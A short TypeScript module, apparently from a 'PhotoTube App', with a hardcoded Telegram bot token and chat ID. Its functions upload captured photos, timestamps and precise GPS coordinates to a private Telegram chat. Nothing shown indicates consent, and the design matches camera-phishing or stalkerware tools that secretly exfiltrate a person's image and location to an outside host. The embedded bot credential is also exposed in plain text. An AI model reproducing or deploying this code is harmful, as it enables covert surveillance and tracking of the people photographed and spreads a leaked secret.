const TELEGRAM_BOT_TOKEN = '7653297508:AAE_sfu893LJ-D5Z5xtr_sjy-XEJvvf7haQ';
const TELEGRAM_CHAT_ID = '5776427389';

export interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
}

export interface TelegramResponse {
  ok: boolean;
  result?: any;
  description?: string;
}

export async function sendPhotoToTelegram(
  photo: Blob,
  location?: LocationData
): Promise<TelegramResponse> {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', photo, 'capture.jpg');
  
  let caption = `📸 Photo captured from PhotoTube App\n⏰ ${new Date().toLocaleString()}`;
  
  if (location) {
    caption += `\n📍 Location: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
    caption += `\n🎯 Accuracy: ±${Math.round(location.accuracy)}m`;
  }
  
  formData.append('caption', caption);

  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  });

  return await response.json();
}

export async function sendLocationToTelegram(location: LocationData): Promise<TelegramResponse> {
  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      latitude: location.latitude,
      longitude: location.longitude
    })
  });

  return await response.json();
}
